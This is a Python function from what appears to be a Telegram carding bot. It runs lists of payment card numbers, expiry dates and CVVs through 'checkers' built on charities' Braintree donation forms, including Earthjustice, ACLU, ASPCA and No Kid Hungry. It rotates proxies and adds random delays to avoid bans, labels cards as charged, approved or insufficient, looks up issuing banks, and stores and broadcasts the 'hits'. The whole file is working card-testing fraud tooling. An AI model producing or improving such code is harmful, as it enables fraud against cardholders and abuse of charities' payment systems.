async def process_braintree_cards(user_id, chat_id, gateway, cards, cancel_event, job_id):
    """Process cards through Braintree donation checkers"""
    print(f"[{gateway.upper()}] Starting check for user {user_id}, job {job_id}", flush=True)
    
    # Initialize checker
    if gateway == "earthjustice":
        checker = EarthjusticeChecker()
        display_name = "Earthjustice"
    elif gateway == "actionhunger":
        checker = ActionAgainstHungerChecker()
        display_name = "Action Against Hunger"
    elif gateway == "nokidhungry":
        checker = NoKidHungryChecker()
        display_name = "No Kid Hungry"
    elif gateway == "aclu":
        checker = ACLUChecker()
        display_name = "ACLU"
    elif gateway == "nrdc":
        checker = NRDCChecker()
        display_name = "NRDC"
    elif gateway == "aspca":
        checker = ASPCAChecker()
        display_name = "ASPCA"
    elif gateway == "irc":
        checker = IRCRescueChecker()
        display_name = "IRC Rescue"
    elif gateway == "aarp":
        checker = AARPChecker()
        display_name = "AARP Foundation"
    else:
        print(f"[ERROR] Unknown gateway: {gateway}", flush=True)
        return
    
    # Get proxies
    proxies = await get_user_proxies(user_id)
    proxy_list = []
    if proxies:
        for p in proxies:
            try:
                proxy_url = get_proxy_url(p)
                if proxy_url:
                    proxy_list.append(proxy_url)
            except:
                pass
    
    # Stats
    stats = {
        "total": len(cards),
        "checked": 0,
        "charged": 0,
        "approved": 0,
        "ccn": 0,
        "insufficient": 0,
        "declined": 0,
        "errors": 0
    }
    
    # Status message
    status_msg_text = f"""
⚡️ *{display_name} Braintree Checker*
━━━━━━━━━━━━━━━━━━
💳 *Cards:* `{stats['total']}`
🌐 *Proxy:* `{'Enabled ✅' if proxy_list else 'Disabled ❌'}`
━━━━━━━━━━━━━━━━━━
_Starting check..._
    """
    
    try:
        status_msg = await tg_send_message(chat_id, status_msg_text, parse_mode='Markdown')
    except:
        status_msg = None
    
    start_time = time.time()
    
    for i, card_line in enumerate(cards):
        if cancel_event.is_set():
            print(f"[{gateway.upper()}] Check cancelled by user", flush=True)
            break
        
        stats["checked"] = i + 1
        
        # Parse card
        try:
            parts = card_line.strip().split('|')
            if len(parts) < 4:
                print(f"[{gateway.upper()}] Invalid card format: {card_line}", flush=True)
                stats["errors"] += 1
                continue
            
            cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
            
            # Normalize month/year
            if len(mes) == 1:
                mes = f'0{mes}'
            if len(ano) == 2:
                ano = f'20{ano}'
        except Exception as e:
            print(f"[{gateway.upper()}] Error parsing card {card_line}: {e}", flush=True)
            stats["errors"] += 1
            continue
        
        # Select proxy
        proxy = None
        if proxy_list:
            proxy = random.choice(proxy_list)
        
        # Check card
        print(f"[{gateway.upper()}] [{i+1}/{stats['total']}] Checking: {card_line}", flush=True)
        
        try:
            result_type, result_msg = await checker.check_card(cc, mes, ano, cvv, proxy=proxy)
            
            # Update stats
            if result_type == "CHARGED":
                stats["charged"] += 1
            elif result_type == "APPROVED":
                stats["approved"] += 1
            elif result_type == "CCN":
                stats["ccn"] += 1
            elif result_type == "INSUFFICIENT":
                stats["insufficient"] += 1
            elif result_type == "DECLINED":
                stats["declined"] += 1
            else:
                stats["errors"] += 1
            
            # Get BIN info
            try:
                bin_info = await lookup_bin(cc)
                bank_name = bin_info.get('bank', 'Unknown')
                country_flag = bin_info.get('emoji', '🌍')
                card_brand = bin_info.get('brand', 'CARD')
            except:
                bank_name = "Unknown"
                country_flag = "🌍"
                card_brand = "CARD"
            
            # Send result
            if result_type == "CHARGED":
                res_msg = f"""
💰 *CHARGED* - {display_name}
💳 `{card_line}`
🏦 `{bank_name}` {country_flag}
📝 `{result_msg}`
                """
                await tg_send_message(chat_id, res_msg, parse_mode='Markdown')
                
                # Save to database
                await db_add_hit(user_id, gateway, "CHARGED", card_line, {"reason": result_msg, "bank": bank_name})
                await broadcast_hit_to_channel(user_id, card_line, "CHARGED", gateway.upper(), result_msg)
                
            elif result_type in ["APPROVED", "CCN"]:
                res_msg = f"""
✅ *{result_type}* - {display_name}
💳 `{card_line}`
🏦 `{bank_name}` {country_flag}
📝 `{result_msg}`
                """
                await tg_send_message(chat_id, res_msg, parse_mode='Markdown')
                
                # Save to database
                await db_add_hit(user_id, gateway, result_type, card_line, {"reason": result_msg, "bank": bank_name})
                
            elif result_type == "INSUFFICIENT":
                res_msg = f"""
💸 *INSUFFICIENT FUNDS* - {display_name}
💳 `{card_line}`
🏦 `{bank_name}` {country_flag}
                """
                await tg_send_message(chat_id, res_msg, parse_mode='Markdown')
                
                # Save to database
                await db_add_hit(user_id, gateway, "INSUFFICIENT", card_line, {"reason": result_msg, "bank": bank_name})
            
            # Print to terminal (live logs)
            print(f"[{gateway.upper()}] {result_type}: {card_line} - {result_msg}", flush=True)
            
        except Exception as e:
            print(f"[{gateway.upper()}] Error checking {card_line}: {e}", flush=True)
            stats["errors"] += 1
        
        # Remove card from queue
        try:
            current_cards = await get_user_cards(user_id)
            if card_line in current_cards:
                current_cards.remove(card_line)
                await save_user_cards(user_id, current_cards)
        except:
            pass
        
        # Update status message every 5 cards
        if status_msg and (i + 1) % 5 == 0:
            elapsed = time.time() - start_time
            rate = stats["checked"] / elapsed if elapsed > 0 else 0
            
            update_text = f"""
⚡️ *{display_name} Braintree Checker*
━━━━━━━━━━━━━━━━━━
📊 *Progress:* `{stats['checked']}/{stats['total']}`
⏱ *Rate:* `{rate:.1f} cards/sec`
━━━━━━━━━━━━━━━━━━
💰 *Charged:* `{stats['charged']}`
✅ *Approved:* `{stats['approved']}`
💸 *Insufficient:* `{stats['insufficient']}`
🔒 *CCN:* `{stats['ccn']}`
❌ *Declined:* `{stats['declined']}`
⚠️ *Errors:* `{stats['errors']}`
            """
            try:
                await tg_edit_message_text(update_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode='Markdown')
            except:
                pass
        
        # Delay between cards (prevent bans)
        await asyncio.sleep(random.uniform(2, 4))
    
    # Final summary
    elapsed = time.time() - start_time
    final_text = f"""
🏁 *{display_name} Check Complete!*
━━━━━━━━━━━━━━━━━━
📊 *Total Checked:* `{stats['checked']}/{stats['total']}`
⏱ *Time:* `{elapsed:.1f}s`
━━━━━━━━━━━━━━━━━━
💰 *Charged:* `{stats['charged']}`
✅ *Approved:* `{stats['approved']}`
💸 *Insufficient:* `{stats['insufficient']}`
🔒 *CCN:* `{stats['ccn']}`
❌ *Declined:* `{stats['declined']}`
⚠️ *Errors:* `{stats['errors']}`
━━━━━━━━━━━━━━━━━━
    """
    
    try:
        await tg_send_message(chat_id, final_text, parse_mode='Markdown')
    except:
        pass
    
    print(f"[{gateway.upper()}] Check complete. Job {job_id} finished.", flush=True)


